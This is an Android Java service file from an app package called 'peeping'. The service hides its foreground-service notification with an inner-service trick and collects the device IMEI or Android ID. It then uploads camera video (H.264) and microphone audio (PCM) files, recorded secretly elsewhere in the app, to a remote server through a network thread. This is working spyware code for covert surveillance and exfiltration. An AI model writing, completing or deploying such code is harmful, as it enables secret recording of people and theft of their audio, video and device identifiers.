package com.peeping;

import java.io.File;
import java.io.FileOutputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import android.app.Notification;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Environment;
import android.os.IBinder;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

public class ServiceNetWork extends Service{
	
	private final static String TAG = "NetWorkService";
	private static final int GRAY_SERVICE_ID = -1;
	private final String H264SUFFIX_WITH_DOT = ".h264";
	private final String PCMSUFFIX_WITH_DOT = ".pcm";
	//private final String H264PARAMSUFFIX_WITH_DOT = ".h264param";
	
	
	//init must be public
	public ServiceNetWork(){
		Log.e(TAG, "ServiceNetWork");
	}
	
	@Override
	public void onCreate() {
		super.onCreate();
		Log.d(TAG, "onCreate");
	}
	
	@SuppressWarnings("deprecation")
	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		Log.d(TAG, "onStart");
	}
	
	@Override
	public void onDestroy() {
		super.onDestroy();
		Log.d(TAG, "onDestroy()");
	}
	
	@Override
	public IBinder onBind(Intent intent) {
		Log.e(TAG, "onBind");
		return null;
	}
	
	@Override
	public boolean onUnbind(Intent intent) {
		Log.e(TAG, "onUnbind");
		return super.onUnbind(intent);
	}
	
	
	
	@Override
	public int onStartCommand(Intent intent, int flags, int startId) {
		Log.d(TAG, "onStartCommand");

	    try {
	        if (Build.VERSION.SDK_INT < 18) {
	            startForeground(GRAY_SERVICE_ID, new Notification());
	            Log.d(TAG,"Build.VERSION.SDK_INT < 18");
	        } 
	        else {
	        	Context context = getApplicationContext();
	            Intent innerIntent = new Intent(context, GrayInnerService.class);
	            innerIntent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
	            startService(innerIntent);
	            startForeground(GRAY_SERVICE_ID, new Notification());
	            Log.d(TAG,"Build.VERSION.SDK_INT >= 18");
	        }
	    	
	    	String SDCARDPATH = "";
	    	String LOCAL_PATH_NAME = "";
	    	boolean sdCardExist = Environment.getExternalStorageState().equals(android.os.Environment.MEDIA_MOUNTED);
	    	if(sdCardExist){
	    		SDCARDPATH = Environment.getExternalStorageDirectory().getAbsolutePath();
	        	LOCAL_PATH_NAME = SDCARDPATH + Peeping.LOCAL_FOLDER_NAME;
	    	}else{
	    		Log.e(TAG, "not found sdcard");
	    		return super.onStartCommand(intent, flags, startId);
	    	}
	    	
	        Context context = getApplicationContext();
    	   	TelephonyManager tm = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
    	   	String strimei = tm.getDeviceId();
    	   	if (strimei == null || strimei.equals("") == true) {
    	   		strimei = Settings.Secure.getString(context.getApplicationContext().getContentResolver(), Settings.Secure.ANDROID_ID);
    	   		if (strimei == null || strimei.equals("") == true) {
    	   			Log.e(TAG, "get device id error");
    	   		}
    	   	}
	    	
	        SimpleDateFormat sdf= new SimpleDateFormat("yyyy_MM_dd_HH_mm_ss",Locale.CHINA);
	        Date date =new Date();
	        String dateformat=sdf.format(date);

	        String h264filename = dateformat + H264SUFFIX_WITH_DOT;
	        String pcmfilename =  dateformat + PCMSUFFIX_WITH_DOT;
			
	        File fh264 = new File(LOCAL_PATH_NAME + AvcEncoder.PEEPINGCAMERA_FILENAME);
	        if(fh264.exists()){
	        	byte[] h264data = new byte[20];

	            int offset = 0;
	    		byte[] bytewidth = PublicFunction.intToBytes(Peeping.width);
	    		for (int i = 0; i < bytewidth.length; i++) {
	    			h264data[offset + i] = bytewidth[i];
	    		}
	    		offset += 4;
	    		
	    		byte[] byteheight = PublicFunction.intToBytes(Peeping.height);
	    		for (int i = 0; i < byteheight.length; i++) {
	    			h264data[offset + i] = byteheight[i];
	    		}
	    		offset += 4;
	    		
	    		byte[] byteframerate = PublicFunction.intToBytes(Peeping.framerate);
	    		for (int i = 0; i < byteframerate.length; i++) {
	    			h264data[offset + i] = byteframerate[i];
	    		}
	    		offset += 4;
	    		
	    		byte[] bytekeyframes_persec = PublicFunction.intToBytes(Peeping.keyframes_persec);
	    		for (int i = 0; i < bytekeyframes_persec.length; i++) {
	    			h264data[offset + i] = bytekeyframes_persec[i];
	    		}
	    		offset += 4;
	    		
	    		byte[] bytebitrate = PublicFunction.intToBytes(Peeping.bitrate);
	    		for (int i = 0; i < bytebitrate.length; i++) {
	    			h264data[offset + i] = bytebitrate[i];
	    		}
	    		offset += 4;
		    	
	        	FileOutputStream fout=new FileOutputStream(fh264,true);
	        	fout.write(h264data,0,20);
	        	fout.close();
	        	
	        	NetworkProcess nwp=new NetworkProcess(LOCAL_PATH_NAME + AvcEncoder.PEEPINGCAMERA_FILENAME,
	        			NetworkProcess.CMD_UPLOAD_H264FILE,strimei.getBytes(),h264filename);
	        	Thread threadsend = new Thread(nwp);
		    	threadsend.start();
	        }
	        
	        File fpcm = new File(LOCAL_PATH_NAME + PcmAudioRecord.AUDIORECORD_FILENAME);
	        if(fpcm.exists()){
	        	NetworkProcess nwp = new NetworkProcess(LOCAL_PATH_NAME + PcmAudioRecord.AUDIORECORD_FILENAME,
	        			NetworkProcess.CMD_UPLOAD_PCMFILE,strimei.getBytes(),pcmfilename);
		    	Thread threadsend = new Thread(nwp);
		    	threadsend.start();
	        }
	        
	        return START_NOT_STICKY;
	    } catch (Exception ex) {
	        ex.printStackTrace();
	        Log.e(TAG, "onStartCommand exception:" + PublicFunction.getExceptionDetail(ex) + "\r\nstack:" +PublicFunction.getCallStack() );
	        return START_NOT_STICKY;
	    }
	    
	}
	

	
	//must be public static
	public static class GrayInnerService extends Service {
		
	    @Override
	    public void onCreate() {
	    	Log.e("GrayInnerService","onCreate");

	        super.onCreate();
	    }
	    
		@SuppressWarnings("deprecation")
		@Override
		public void onStart(Intent intent, int startId) {
			super.onStart(intent, startId);
			Log.d("GrayInnerService", "onStart");
			//System.out.println("service onstart\r\n");
		}
	
	    @Override
	    public int onStartCommand(Intent intent, int flags, int startId) {
	    	Log.e("GrayInnerService","onStartCommand");
	        startForeground(GRAY_SERVICE_ID, new Notification());
	        //stopForeground(true);
	        stopSelf();
	        return super.onStartCommand(intent, flags, startId);
	    }
	
	    @Override
	    public IBinder onBind(Intent intent) {

	    	Log.e("GrayInnerService","onBind");
	        throw new UnsupportedOperationException("Not yet implemented");
	    }
	
	    @Override
	    public void onDestroy() {

	    	Log.e("GrayInnerService","onDestroy");
	        super.onDestroy();
	    }
	}
	
}
